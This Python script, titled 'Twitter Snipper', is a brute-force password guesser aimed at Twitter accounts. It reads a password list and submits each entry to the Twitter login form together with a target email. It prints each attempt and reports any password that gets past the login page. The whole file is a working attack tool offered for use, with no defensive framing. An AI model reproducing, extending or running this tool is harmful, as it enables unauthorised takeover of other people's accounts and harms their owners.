import mechanicalsoup
from optparse import OptionParser
parse = OptionParser("""
  _____        _ _   _            _____       _                       
|_   _|      (_) | | |          /  ___|     (_)                      
  | |_      ___| |_| |_ ___ _ __\ `--. _ __  _ _ __  _ __   ___ _ __ 
  | \ \ /\ / / | __| __/ _ \ '__|`--. \ '_ \| | '_ \| '_ \ / _ \ '__|
  | |\ V  V /| | |_| ||  __/ |  /\__/ / | | | | |_) | |_) |  __/ |   
______\_/\_/___|\___\__\___|_|  \____/|_| |_|_| .__/| .__/ \___|_| _ 
| ___ \     |  \/  |     | |                  | |   | |           | |
| |_/ /_   _| .  . |_   _| |__   __ _ _ __ ___|__ __|___   ___  __| |
| ___ \ | | | |\/| | | | | '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \/ _` |
| |_/ / |_| | |  | | |_| | | | | (_| | | | | | | | | | | |  __/ (_| |
\_____ \__, \_|  |_/\__,_|_| |_|\__,_|_| |_| |_|_| |_| |_|\___|\__,_|
/  ___| __/ | |                                                      
\ `--. |____| | __ _ _ __ ___   __ _                                 
 `--. \/ _` | |/ _` | '_ ` _ \ / _` |                                
/\__/ / (_| | | (_| | | | | | | (_| |                                
\____/ \__,_|_|\__,_|_| |_| |_|\__,_|                                
                                                                     
                                                                     
--help for help
this script was written by Muhammed Salama
https://github.com/MohammedSalama
https://twitter.com/Mohamed90466173
https://stackoverflow.com/users/9510093/muhammed-salama
""")
parse.add_option('-e','--email',dest='email',type='string',help='the account email')
parse.add_option('-l','--list',dest='password_list',type='string',help='password list')
(options,args) = parse.parse_args()
if options.email == None or  options.password_list == None:
    print(parse.usage)
    exit(0)
else:
    try:
        print("<<<<<<++++++start attacking email+++++>>>>>")
        browser = mechanicalsoup.Browser(soup_config={"features":"html.parser"})
        login_page = browser.get("https://twitter.com/login?lang=en")
        password_list = options.password_list
        email = options.email
        open_password_list = open(password_list,'r')
        for i in open_password_list.readlines():
            i = i.rstrip("\n")
            login_form = login_page.soup.select("form")[1]
            login_form.select("input")[0]['value'] = email #username
            login_form.select("input")[1] ['value'] = i #password
            secound_page = browser.submit(login_form,login_page.url)
            print("[*]trying {0}".format(i))
            if secound_page.soup.select("title")[0].text != "Login on Twitter":
                print ("[+] login password is {0}".format(i))
                exit(0)
    except Exception as e:
        print(e)
    except KeyboardInterrupt:
        print("OK ! as you like")
